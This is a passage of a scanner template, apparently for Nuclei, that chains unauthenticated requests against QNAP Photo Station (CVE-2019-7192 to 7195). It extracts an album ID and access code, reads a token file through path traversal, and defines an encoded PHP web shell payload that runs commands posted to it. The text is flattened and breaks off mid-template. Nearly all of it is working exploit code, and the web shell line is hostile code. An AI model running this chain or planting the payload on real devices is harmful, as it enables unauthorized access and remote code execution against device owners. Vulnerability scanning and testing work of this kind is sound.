CVE-2019-7192,CVE-2019-7193,CVE-2019-7194,CVE-2019-7195 cwe-id: CWE-78 tags: cve,cve2019,qnap,rce,photostation,unauth,injection,lfi,kev,pocvariables: command_payload: '%3C%3F%3d%60%24_POST%5Bx%5D%60%3f%3e%40s.tp' dropper_command: "x= echo $((0x2C06*1337))" dropper_filename: "{{to_lower(rand_text_alpha(6))}}"http: - method: POST path: - "{{BaseURL}}/photo/p/api/album.php" headers: Content-Type: application/x-www-form-urlencoded body: "a=setSlideshow&f=qsamplealbum" extractors: - type: regex name: album_id group: 1 internal: true regex: - "<output>([a-zA-Z0-9]+)</output>" - method: GET path: - "{{BaseURL}}/photo/slideshow.php?album={{album_id}}" extractors: - type: regex name: access_code group: 1 internal: true regex: - "encodeURIComponent\\('([A-Za-z0-9%]+)'\\)" - type: regex part: header name: phpsessid group: 1 internal: true regex: - "PHPSESSID=([a-z0-9]+);" - method: POST path: - "{{BaseURL}}/photo/p/api/video.php" headers: Content-Type: application/x-www-form-urlencoded Cookie: "PHPSESSID={{phpsessid}}" body: "a=caption&f=UMGObv&album={{album_id}}&ac={{access_code}}&filename=../../../../../share/Multimedia/.@__thumb/ps.app.token" extractors: -
